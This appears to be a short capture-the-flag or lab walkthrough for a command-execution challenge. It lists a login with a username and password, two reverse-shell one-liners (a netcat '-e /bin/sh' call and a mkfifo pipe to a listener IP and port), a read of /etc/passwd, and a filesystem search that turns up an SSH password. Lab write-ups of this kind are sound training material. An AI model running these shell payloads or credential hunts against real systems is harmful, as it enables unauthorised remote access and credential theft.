# Command execution

## Notes

```
login using pingudad:secretpass

using revershell from pentestmonkey
nc -e /bin/sh 10.9.18.129 1234 => NOT WORKING

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.18.129 1234 >/tmp/f

```

## Questions

1. How many files are in the current directory?

```
ls

2591c98b70119fe624898b1e424b5e91.php administrator.php index.html index.html

3

```

2. Do I still have an account

```
cat /etc/passwd => search for pingu

yes
```

3. What is my ssh password?

```
find / -name pass 2>/dev/null
/var/hidden/pass

pinguapingu
```
